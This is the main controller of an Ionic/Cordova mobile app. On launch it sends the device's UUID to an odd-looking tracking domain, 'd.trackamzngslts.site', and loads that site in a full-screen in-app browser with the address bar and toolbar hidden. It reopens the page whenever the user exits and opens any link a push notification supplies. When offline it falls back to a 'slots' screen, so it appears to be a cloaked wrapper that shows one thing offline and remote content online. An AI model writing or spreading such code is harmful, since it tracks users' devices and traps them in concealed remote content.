angular.module('app.controllers', [])
    .controller('appController', function ($scope, $cordovaNetwork, $rootScope, $http, $timeout, $cordovaDevice, $ionicPlatform,
                                           $cordovaInAppBrowser, $ionicPush) {
        var vm = this;

        $ionicPlatform.ready(function () {

            var mainDomain = 'http://d.trackamzngslts.site';
            var appId = '1080';
            var options = {
                disallowoverscroll: 'yes',
                location: 'no',
                toolbar: 'no',
                zoom: 'no',
                clearcache: 'no',
                hidestatusbar: 'yes',
                hardwareback: 'yes',
                hidden: 'no'
            };


            $timeout(function () {
                var deviceId = $cordovaDevice.getUUID();
                vm.isWorkingStatus = $cordovaNetwork.isOnline() ? 'on' : 'off';
                vm.portal = mainDomain + '/?app_id=' + appId + '&gaid=' + deviceId;

                if (Branch) {
                    Branch.initSession(function (data) {
                        // read deep link data on click
                    }).then(function (res) {
                        if (deviceId) {
                            Branch.setIdentity(deviceId).then(function (res) {

                            }).catch(function (err) {

                            });
                        }
                    }).catch(function (err) {

                    });
                }


                $ionicPush.register().then(function (t) {
                    return $ionicPush.saveToken(t);
                }).then();

                function init() {
                    $cordovaInAppBrowser.open(vm.portal, '_blank', options);
                }

                if (vm.isWorkingStatus === 'on') {
                    init();
                }
                else {
                    vm.isWorkingStatus = 'off';
                    vm.status = 'slots';
                }

                $rootScope.$on('$cordovaInAppBrowser:loaderror', function (e, event) {
                    if (event && event.code !== -999) {
                        $cordovaInAppBrowser.close();
                        vm.isWorkingStatus = 'off';
                    }
                });


                $scope.$on('cloud:push:notification', function (event, data) {
                    if (!data || data.message.raw.additionalData.foreground) return;
                    var msg = data.message;
                    if (data && msg.payload && msg.payload.link) {
                        if ($cordovaNetwork.isOnline()) {
                            $cordovaInAppBrowser.open(msg.payload.link, '_blank', options);
                            $rootScope.browserOpen = true;
                            vm.isWorkingStatus = 'on';
                        }
                        else {
                            vm.isWorkingStatus = 'off';
                        }
                    }
                });


                vm.checkStatus = function () {
                    if ($cordovaNetwork.isOnline()) {
                        init();
                        vm.isWorkingStatus = 'on';
                    }
                    else {
                        vm.isWorkingStatus = 'off';
                    }
                };


                $rootScope.$on('$cordovaInAppBrowser:exit', function (e, event) {
                    $cordovaInAppBrowser.open(vm.portal, '_blank', options);
                });


            });
        });
    })
;

